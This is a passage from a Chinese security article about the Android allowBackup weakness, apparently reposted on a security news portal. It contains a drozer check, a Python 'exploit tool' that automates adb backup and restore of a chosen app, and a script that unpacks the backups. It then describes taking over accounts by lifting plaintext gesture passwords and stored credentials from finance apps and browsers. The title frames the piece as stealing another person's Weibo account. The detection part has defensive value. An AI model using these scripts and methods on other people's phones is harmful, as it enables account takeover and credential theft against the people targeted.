&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerable=0
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;lines:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;line&nbsp;=&nbsp;str(line)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isApplicationTag=re.search(r1,line)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;isApplicationTag&nbsp;!=&nbsp;None:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isAllowBackup=re.search(r2,line)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#self.stdout.write(line+&quot;\n&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;isAllowBackup&nbsp;==&nbsp;None:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.stdout.write(&quot;[color&nbsp;red]&nbsp;%s&nbsp;is&nbsp;vulnerable[/color]&quot;%package+&quot;\n&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">运行截图：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;</span></p><p style="text-align:center"><img style="width: 500px; height: 380px;" title="drozer1" src="http://p0.qhimg.com/t01eb7996de76de90aa.jpg" alt="drozer1" height="380" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">注意事项：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 此drozer 
module检测原理是匹配应用manifest文件中是否配置了allowBackup=“false”来判断应用数据是否可备份和恢复，实际测试会发
现一部分应用能成功备份和恢复但就是无法登录（比如手机淘宝和京东客户端），这说明厂商已经考虑到此设置可能带来的安全风险，并做出了相应限制，此类应用
是安全的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x06] 编写Python脚本实现自动攻击与利用</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 1.如上文所述，整个漏洞测试过程中需要输入不少命令，对于手速慢和不习惯敲命令的人来说还是略麻烦了点，所以我们可以编写Python脚本来实现自动化攻击和利用。</span></p><pre class="brush:bash;toolbar:false">#!/usr/bin/python
&nbsp;
#coding:utf8
&nbsp;
import&nbsp;commands
&nbsp;
import&nbsp;re,sys
&nbsp;
from&nbsp;optparse&nbsp;import&nbsp;OptionParser
&nbsp;
def&nbsp;usage():
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;&#39;&#39;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;------------------------------------------------------------------
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Android&nbsp;Application&nbsp;AllowBackup&nbsp;Exploit&nbsp;Tool
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Usage:DroidSec_AbHack.py&nbsp;-p&nbsp;com.xxx.xxx(packageName)&nbsp;-b&nbsp;(backup)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DroidSec_AbHack.py&nbsp;-p&nbsp;com.xxx.xxx(packageName)&nbsp;-r&nbsp;(restore)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;How&nbsp;to&nbsp;check&nbsp;the&nbsp;&nbsp;security&nbsp;vulnerabilities&nbsp;of&nbsp;application?
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Go&nbsp;to&nbsp;the&nbsp;professional&nbsp;Android&nbsp;security&nbsp;Website!
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&nbsp;http://www.droidsec.cn&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;------------------------------------------------------------------
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&#39;&#39;&#39;
&nbsp;
class&nbsp;AbHack:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,adb,pkg):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.adbdir=adb
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.package=pkg
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getinfo(self):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(status,output)=commands.getstatusoutput(self.adbdir+&#39;devices&#39;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=re.findall(&#39;device&#39;,output)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(r)&nbsp;&gt;=&nbsp;2:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&quot;ok&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&quot;waiting&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;backup(self):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.getinfo()==&quot;ok&quot;:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Start&nbsp;backup......&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output=commands.getoutput(str(self.adbdir)+&quot;backup&nbsp;-nosystem&nbsp;-noshared&nbsp;-apk&nbsp;-f&nbsp;&quot;+str(self.package)+&quot;.ab&nbsp;&quot;+str(self.package))
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;output
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;backup&nbsp;success!&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Please&nbsp;connect&nbsp;your&nbsp;mobile&nbsp;phone(usb&nbsp;debugging&nbsp;must&nbsp;been&nbsp;enabled)&nbsp;or&nbsp;check&nbsp;the&nbsp;ADB&nbsp;directory&nbsp;is&nbsp;configurd&nbsp;properly&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;restore(self):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commands.getstatusoutput(self.adbdir+&quot;kill-server&quot;)&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;self.getinfo()==&quot;ok&quot;:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;start&nbsp;restore...&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output=commands.getoutput(str(self.adbdir)+&quot;restore&nbsp;&quot;+str(self.package)+&quot;.ab&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;output
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Please&nbsp;connect&nbsp;your&nbsp;mobile&nbsp;phone(usb&nbsp;debugging&nbsp;must&nbsp;been&nbsp;enabled)&nbsp;or&nbsp;check&nbsp;the&nbsp;ADB&nbsp;directory&nbsp;is&nbsp;configured&nbsp;properly&quot;
&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;adbdir=&quot;/Users/nickycc/Downloads/adt-bundle-mac/sdk/platform-tools/adb&nbsp;&quot;&nbsp;#please&nbsp;set&nbsp;the&nbsp;ADB&nbsp;file&nbsp;directory&nbsp;before&nbsp;use
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;=&nbsp;OptionParser()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&quot;-p&quot;,&nbsp;action=&quot;store&quot;,&nbsp;dest=&quot;pkg&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&quot;-b&quot;,&nbsp;action=&quot;store_true&quot;,dest=&quot;abhack&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&quot;-r&quot;,&nbsp;action=&quot;store_false&quot;,dest=&quot;abhack&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;(options,&nbsp;args)&nbsp;=&nbsp;parser.parse_args()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;usage()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(sys.argv)&nbsp;&lt;=1:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;options.abhack==True:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Backup=AbHack(adbdir,options.pkg)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Backup.backup()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;options.abhack==False:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Restore=AbHack(adbdir,options.pkg)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Restore.restore()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">运行截图：</span></p><p style="text-align:center"><img style="width: 500px; height: 205px;" title="backup1" src="http://p2.qhimg.com/t0110e6481388185b4e.jpg" alt="backup1" height="205" border="0" vspace="0" width="500"/></p><p style="text-align:center"><img style="width: 500px; height: 197px;" title="restore" src="http://p8.qhimg.com/t018577679c02b9c234.jpg" alt="restore" height="197" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2.应用备份生成的.ab文件其实是可以解包的，解包后的目录结构如下：</span></p><p style="text-align:center"><img style="width: 500px; height: 152px;" title="1F5116A2-C43C-43F8-8266-BA124C9DC926" src="http://p1.qhimg.com/t0174213f66ebdb09e6.jpg" alt="1F5116A2-C43C-43F8-8266-BA124C9DC926" height="152" border="0" vspace="0" width="500"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">分别对应了androidmanifest.xml，apk安装包，database目录，files目录，其它目录以及shared_prefs目录，我们可以通过解包来对窃取的应用数据进一步分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 解包的python脚本如下：</span></p><pre class="brush:python;toolbar:false">#&nbsp;coding=utf-8
&nbsp;
import&nbsp;argparse
&nbsp;
import&nbsp;os
&nbsp;
import&nbsp;sys
&nbsp;
import&nbsp;zlib
&nbsp;
C_BUFFER_SIZE&nbsp;=&nbsp;1048576
&nbsp;
def&nbsp;ArgParse():
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Parses&nbsp;the&nbsp;command&nbsp;line&nbsp;arguments
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;:return:&nbsp;argparse&nbsp;dictionary
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;parse&nbsp;command&nbsp;line&nbsp;arguments
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;=&nbsp;argparse.ArgumentParser(
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;description=&quot;xbackup:&nbsp;extracts&nbsp;an&nbsp;Android&nbsp;ICS+&nbsp;backup&nbsp;file.&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;ipath&quot;,
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;Input&nbsp;path.&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;opath&quot;,
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;output&nbsp;path.&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;args&nbsp;=&nbsp;parser.parse_args()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;args
&nbsp;
def&nbsp;Extract(args):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Extracts&nbsp;the&nbsp;.tar&nbsp;file&nbsp;of&nbsp;an&nbsp;Android&nbsp;Backup.&nbsp;Assumes&nbsp;the&nbsp;backup&nbsp;is&nbsp;not&nbsp;encrypted&nbsp;and&nbsp;is
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;compressed.
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;:param&nbsp;args:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;:return:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ifile&nbsp;=&nbsp;open(args.ipath,&nbsp;&quot;rb&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ofile&nbsp;=&nbsp;open(args.opath,&nbsp;&quot;wb&quot;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;ifile.read(C_BUFFER_SIZE)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;data
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pos&nbsp;=&nbsp;data.find(&quot;none\n&quot;)&nbsp;+&nbsp;5
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;data[pos:]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;dc&nbsp;=&nbsp;zlib.decompressobj()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;data:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ofile.write(dc.decompress(data))
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;ifile.read(C_BUFFER_SIZE)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ifile.close()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ofile.close()
&nbsp;
def&nbsp;main():
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;args&nbsp;=&nbsp;ArgParse()
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;os.path.isfile(args.ipath):
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Extract(args)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Could&nbsp;not&nbsp;open&nbsp;input&nbsp;file!.&quot;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0
&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(main())</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">[0x07] 更多猥琐流利用方法</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> 国外安全公司PALO 
ALTO早在2014年8月就发过研究报告称超过94%的流行应用存在此漏洞， 大牛Claud 
Xiao更是在去年Hitcon会议分享过与此有关的研究，如何让这个被很多人厂商视如鸡肋的漏洞有为猥琐的利用呢？这里提两点自己想到的，欢迎大家一起
来交流 : )</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> （1）在APP漏洞里不安全的内部存储绝对是十分常见的漏洞，比如密码明文储存。笔者曾在测试某金融类APP时发现该APP在应用内部(/data
/data/com.xx.xx/shared_prefs/)存储了明文的手势密码(如下图中的lock.xml)，正常情况下如果用户手机是未
ROOT的，就算明文存储也没法获取到，漏洞影响相对较小，而继而我发现该理财APP同时存在allowbackup漏洞，也就是说我可以先将该应用数据
备份到另一台已经获取ROOT手机，然后我不仅获得了用户帐号登录权限，连手势密码我都可以直接修改成任意（服务器端没做验证）或者相同（服务器端有验
证）。还有一种情况是应用数据库中(/data/data/com.xx.xx/database/)直接存储了用户的登录帐号和密码那相当于直接利用
allowbackup盗得了用户帐户密码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"> （2）LastPass(一个用户密码管理工具）曾经被发现存在通过备份到其它手机来清除手势密码来登录获取用户储存在LastPass上的所有密码的漏
洞（CVE-2013-5113 and 
CVE-2013-5114）。发散一下思维，储存用户其它密码的还有哪些应用？对！浏览器，那些习惯了记住密码的用户很可能就会被存在漏洞的浏览器卖
了。其它就看大家的更猥琐的发挥了~</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">参考资料：</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">1. </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://www.paloaltonetworks.de/content/paloaltonetworks-com/global/cn_zh/index/company/press/2014/palo-alto-networks-unveils-security-risks-in-android-internal-storage.html"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://www.paloaltonetworks.de/content/paloaltonetworks-com/global/cn_zh/index/company/press/2014/palo-alto-networks-unveils-security-risks-in-android-internal-storage.html</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2. </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://researchcenter.paloaltonetworks.com/2014/08/insecure-internal-storage-android/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://researchcenter.paloaltonetworks.com/2014/08/insecure-internal-storage-android/</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">3.&nbsp; </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://developer.android.com/reference/android/R.attr.html#allowBackup"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://developer.android.com/reference/android/R.attr.html#allowBackup</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">4.&nbsp; </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://blog.c22.cc/2013/08/01/bsideslv-android-backup-unpacker-release/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://blog.c22.cc/2013/08/01/bsideslv-android-backup-unpacker-release/</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">5.&nbsp; </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://nelenkov.blogspot.fi/2012/06/unpacking-android-backups.html"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://nelenkov.blogspot.fi/2012/06/unpacking-android-backups.html</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">6. </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://github.com/info-lab/ABX"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://github.com/info-lab/ABX</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">7. </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://github.com/mwrlabs/drozer"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://github.com/mwrlabs/drozer</span></a></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 安卓安全中文站<br/><a class="text-more" href="http://www.droidsec.cn/%E8%AF%A6%E8%A7%A3android-app-allowbackup%E9%85%8D%E7%BD%AE%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%A3%8E%E9%99%A9/" target="_blank">原文链接：http://www.droidsec.cn/%E8%AF%A6%E8%A7%A3android-app-allowbackup%E9%85%8D%E7%BD%AE%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%A3%8E%E9%99%A9/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value=" 两分钟窃取身边女神微博帐号？详解Android App AllowBackup配置带来的风险 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="290" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
